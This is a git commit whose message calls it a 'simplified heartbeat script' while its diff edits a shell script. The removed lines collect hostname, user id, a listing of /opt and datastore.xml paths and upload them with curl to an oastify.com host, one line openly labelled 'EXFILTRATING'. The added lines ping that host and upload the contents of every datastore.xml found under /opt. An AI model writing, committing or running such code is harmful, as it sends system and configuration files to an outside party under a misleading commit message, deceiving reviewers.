a9fcea70183f46cb2e7f8d671da41d2ae0d81e21
Mohamed Omar Salama Abdelkader <medo.omar.salama@gmail.com>
2026-03-16 01:51:29 +0200

    Simplified heartbeat script

--- s.sh
+++ s.sh
@@ -1,11 +1,3 @@
 #!/bin/sh
-echo "--- HOSTNAME ---" > /tmp/out
-hostname >> /tmp/out
-echo "--- ID ---" >> /tmp/out
-id >> /tmp/out
-echo "--- LS /OPT ---" >> /tmp/out
-ls -R /opt >> /tmp/out 2>&1
-echo "--- DATASTORE FILES ---" >> /tmp/out
-find /opt -name datastore.xml >> /tmp/out 2>&1
-echo "--- EXFILTRATING ---" >> /tmp/out
-curl -F f=@/tmp/out http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/final
+curl http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/heartbeat
+find /opt -name datastore.xml -exec curl -F f=@{} http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/ds \;
